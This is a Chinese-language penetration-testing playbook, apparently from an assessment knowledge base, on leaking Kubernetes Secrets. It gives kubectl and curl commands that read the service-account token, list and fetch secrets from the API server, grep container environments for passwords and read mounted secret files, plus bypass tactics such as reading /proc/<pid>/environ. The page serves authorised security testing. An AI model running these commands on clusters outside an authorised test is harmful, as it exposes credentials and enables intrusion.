---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-4.1]
mapped_compliance_families: [Secret防泄露]
---

# K8s Secret 泄露

## 1. 前置条件

- ServiceAccount 有 list/get secrets 权限
- Secret 以明文环境变量或文件挂载到 Pod
- etcd 未加密存储或加密密钥可获取
- 容器内可以访问挂载的 Secret 卷

## 2. 探测命令

- [L0] `kubectl get secrets -A` → 期望：列出所有 Secret（需 list 权限）
- [L0] `kubectl get secrets -A -o json | jq '.items[] | {name:.metadata.name, namespace:.metadata.namespace, type:.type}'` → 期望：列出 Secret 名称和类型
- [L0] `kubectl auth can-i list secrets --as=system:serviceaccount:<ns>:<sa-name>` → 期望：返回 yes（SA 可列出 Secret）
- [L1] `kubectl exec <pod> -n <ns> -- ls -la /etc/secrets/` → 期望：发现挂载的 Secret 卷内容
- [L1] `kubectl exec <pod> -n <ns> -- env | grep -iE 'password|secret|token|key|api_key|credential'` → 期望：发现环境变量中的明文凭据
- [L1] `kubectl exec <pod> -n <ns> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token` → 期望：可读取 SA token

## 3. 攻击验证

- [L2] 通过 SA token 读取 Secret 内容：
  `kubectl exec <pod> -n <ns> -- curl -sk https://kubernetes.default.svc/api/v1/namespaces/<ns>/secrets -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"` → 期望：返回 Secret 列表和内容（base64 编码）
- [L2] 读取特定 Secret：
  `kubectl exec <pod> -n <ns> -- curl -sk https://kubernetes.default.svc/api/v1/namespaces/<ns>/secrets/<secret-name> -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"` → 期望：返回 Secret 内容
- [L2] 读取挂载到容器的 Secret 文件：
  `kubectl exec <pod> -n <ns> -- cat /etc/secrets/<key-name>` → 期望：返回 Secret 明文内容（K8s 自动解码 base64）

## 4. 差分证明

- 攻击前 [L0]: Secret 列表存在且 SA 有 list/get 权限
- 攻击后 [L2]: 成功读取 Secret 的明文值（如数据库密码、API Key）
- 对比：kubectl describe secret 显示 data 字段为 `<set>` 但攻击后可解码完整内容
- 攻击前 [L1]: 容器内环境变量包含密码值
- 攻击后 [L1]: 容器内可读取 Secret 卷内容

## 5. 绕过策略

- 若 SA 无 list secrets 权限：枚举常见 Secret 名称逐个 get（default-token、db-password 等）
- 若 Secret 使用 SealedSecrets：寻找未加密的 Secret 或 SealedSecret controller 的密钥
- 若环境变量注入方式有日志脱敏：从 `/proc/<pid>/environ` 直接读取进程环境变量
- 若使用外部 Secret 管理（Vault）：检查 Vault sidecar 注入的 token 文件路径

## 6. 证伪条件

- [L0] SA 无 list/get secrets 权限 → 证伪
- [L0] 所有 Secret 使用外部密钥管理（如 Vault）且未在 K8s 中存储 → 证伪（K8s Secret 层面）
- [L1] 容器内无可读取的 Secret 卷或环境变量 → 证伪
- [L0] NetworkPolicy 限制 Pod 与 API Server 通信且 SA 无法突破 → 证伪

## 7. 审批级别

Level 2：探测命令（kubectl get secrets, env）自动通过。
Level 2：攻击验证（读取 Secret 内容）自动通过。
destructive: false

## 8. MITRE ATT&CK

T1552 - Unsecured Credentials（利用 K8s Secret 明文存储泄露凭证）